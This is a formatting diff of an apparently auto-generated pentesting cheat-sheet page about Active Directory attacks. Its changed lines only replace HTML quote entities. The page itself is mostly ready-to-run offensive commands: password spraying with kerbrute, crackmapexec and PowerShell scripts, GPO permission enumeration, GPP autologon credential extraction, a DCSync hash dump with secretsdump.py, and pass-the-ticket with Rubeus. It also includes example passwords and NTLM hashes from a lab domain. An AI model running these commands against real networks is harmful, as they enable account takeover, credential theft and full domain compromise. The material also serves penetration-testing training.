@@ -27670,14 +27670,14 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
 <span class="normal"><a href="#__codelineno-0-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a>$PDC = ($domainObj.PdcRoleOwner).Name
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>$SearchString = &quot;LDAP://&quot;
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>$SearchString = "LDAP://"
 </span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>$SearchString += $PDC + &quot;/&quot;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a>$SearchString += $PDC + "/"
 </span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>$DistinguishedName = &quot;DC=$($domainObj.Name.Replace(&#39;.&#39;, &#39;,DC=&#39;))&quot;
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>$SearchString += $DistinguishedName
 </span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>New-Object System.DirectoryServices.DirectoryEntry($SearchString, &quot;pete&quot;, &quot;Nexus123!&quot;)
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
 </span></code></pre></div></td></tr></table></div>
 <h3 id="spray-passwordsps1">Spray-Passwords.ps1</h3>
 <p>Basic usage:</p>
@@ -27706,7 +27706,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a>Invoke-DomainPasswordSpray -UserList userlist.txt -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
 </span></code></pre></div></td></tr></table></div>
 <h3 id="kerbrute">kerbrute</h3>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users.txt  &quot;Welcome1&quot;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>./kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_ad_users.txt  "Welcome1"
 </span></code></pre></div></td></tr></table></div>
 <h3 id="crackmapexec">crackmapexec</h3>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
@@ -27717,7 +27717,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-4-6">6</a></span>
 <span class="normal"><a href="#__codelineno-4-7">7</a></span>
 <span class="normal"><a href="#__codelineno-4-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="c"># Spraying password with crackmapexec</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">75</span> <span class="n">-u</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-p</span> <span class="s1">&#39;Nexus123!&#39;</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-continue-on-success</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">75</span> <span class="n">-u</span> <span class="n">users</span><span class="p">.</span><span class="n">txt</span> <span class="n">-p</span> <span class="s1">'Nexus123!'</span> <span class="n">-d</span> <span class="n">corp</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">-continue-on-success</span>
 </span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>
 </span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4"></a>
 </span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5"></a><span class="n">crackmapexec</span> <span class="n">smb</span> <span class="nv">$ip</span><span class="p">/</span><span class="n">23</span> <span class="n">-u</span> <span class="p">/</span><span class="n">folder</span><span class="p">/</span><span class="n">userlist</span><span class="p">.</span><span class="n">txt</span> <span class="n">-u</span> <span class="n">administrator</span> <span class="n">-H</span> <span class="n">88ad09182de639ccc6579eb0849751cf</span> <span class="p">-</span><span class="n">-local-auth</span> <span class="p">-</span><span class="n">-continue-on-success</span> <span class="p">|</span> <span class="n">grep</span> <span class="p">+</span>
@@ -27740,10 +27740,10 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-CleverSpray</span><span class="p">.</span><span class="n">ps1</span>
 </span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a>
 </span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="c"># Spray a unique password:</span>
-</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="nb">Invoke-CleverSpray</span> <span class="n">-Password</span> <span class="s2">&quot;Passw0rd&quot;</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="nb">Invoke-CleverSpray</span> <span class="n">-Password</span> <span class="s2">"Passw0rd"</span>
 </span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a>
 </span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a><span class="c"># Spray multiple passwords:</span>
-</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="nb">Invoke-CleverSpray</span> <span class="n">-PasswordFile</span> <span class="s2">&quot;.\pwd_list.txt&quot;</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="nb">Invoke-CleverSpray</span> <span class="n">-PasswordFile</span> <span class="s2">".\pwd_list.txt"</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Flags:</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
@@ -27763,7 +27763,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>-Username: samAccountName of the user to target.
 </span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a>-UsernamesFile: Path to file containing a list of samAccountNames to target.
 </span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a>-Domain: The domain to query for users, defaults to the current domain.
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>-Limit: Only users having a &#39;badPwdCount&#39; lower or equal to Limit will be targeted (default is 1 to avoid blocking accounts).
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8"></a>-Limit: Only users having a 'badPwdCount' lower or equal to Limit will be targeted (default is 1 to avoid blocking accounts).
 </span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9"></a>-Delay: Delay between authentication attemps (in s).
 </span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10"></a>-Jitter: Jitter for the authentication attemps delay.
 </span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11"></a>-HideOld: Hide old password discovered (default is false).
@@ -27782,7 +27782,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span></code></pre></div></td></tr></table></div>
 <p>Enumerating GPO Names with PowerView</p>
 <div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
-<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="nv">$sid</span><span class="p">=</span><span class="nb">Convert-NameToSid</span> <span class="s2">&quot;Domain Users&quot;</span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="nv">$sid</span><span class="p">=</span><span class="nb">Convert-NameToSid</span> <span class="s2">"Domain Users"</span>
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a><span class="nb">Get-DomainGPO</span> <span class="p">|</span> <span class="nb">Get-ObjectAcl</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-eq</span> <span class="nv">$sid</span><span class="p">}</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Results:</p>
@@ -27836,9 +27836,9 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Results:
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
 <span class="normal"><a href="#__codelineno-15-2">2</a></span>
-<span class="normal"><a href="#__codelineno-15-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: [&#39;guarddesk&#39;]
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: [&#39;INLANEFREIGHT.LOCAL&#39;]
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: [&#39;ILFreightguardadmin!&#39;]
+<span class="normal"><a href="#__codelineno-15-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a>GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
 </span></code></pre></div></td></tr></table></div></p>
 <h2 id="llmnrnbt-ns-poisoning">💌 LLMNR/NBT-NS Poisoning</h2>
 <p><a href="../5355-LLMNR/">See more</a>. </p>
@@ -28058,9 +28058,9 @@ Configurable parameters in inveigh: <a href="https://github.com/Kevin-Robertson/
 <p>Use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span>
 <span class="normal"><a href="#__codelineno-25-2">2</a></span>
-<span class="normal"><a href="#__codelineno-25-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span><span class="nv">$domain</span>/administrator<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$hostName</span><span class="s2">&quot;</span>@<span class="nv">$hostName</span>.<span class="nv">$domain</span>
+<span class="normal"><a href="#__codelineno-25-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span><span class="nv">$domain</span>/administrator<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="s2">"</span><span class="nv">$hostName</span><span class="s2">"</span>@<span class="nv">$hostName</span>.<span class="nv">$domain</span>
 </span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2"></a><span class="c1"># Example:</span>
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="c1"># secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3"></a><span class="c1"># secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span>
 </span></code></pre></div></td></tr></table></div>
 <p>We can see this by typing <code>klist</code> (using the <code>klist</code> command requires installation of the <a href="https://packages.ubuntu.com/focal/krb5-user">krb5-user</a> package on our attack host. </p>
 <div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span>
@@ -28090,7 +28090,7 @@ Configurable parameters in inveigh: <a href="https://github.com/Kevin-Robertson/
 </span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4"></a><span class="c1"># The $minikerberosTGTHash is obtained from the output of gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>Submitting a TGS Request for Ourselves Using getnthash.py</strong></p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span>INLANEFREIGHT/administrator<span class="w"> </span><span class="s2">&quot;ACADEMY-EA-DC01</span>$<span class="s2">&quot;</span>@172.16.5.5<span class="w"> </span>-hashes<span class="w"> </span>aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a>secretsdump.py<span class="w"> </span>-just-dc-user<span class="w"> </span>INLANEFREIGHT/administrator<span class="w"> </span><span class="s2">"ACADEMY-EA-DC01</span>$<span class="s2">"</span>@172.16.5.5<span class="w"> </span>-hashes<span class="w"> </span>aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
 </span></code></pre></div></td></tr></table></div>
 <h3 id="optional-path-2-rubeus-to-generate-tgt-and-tgs">Optional path #2: rubeus to generate TGT and TGS</h3>
 <p>once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.</p>
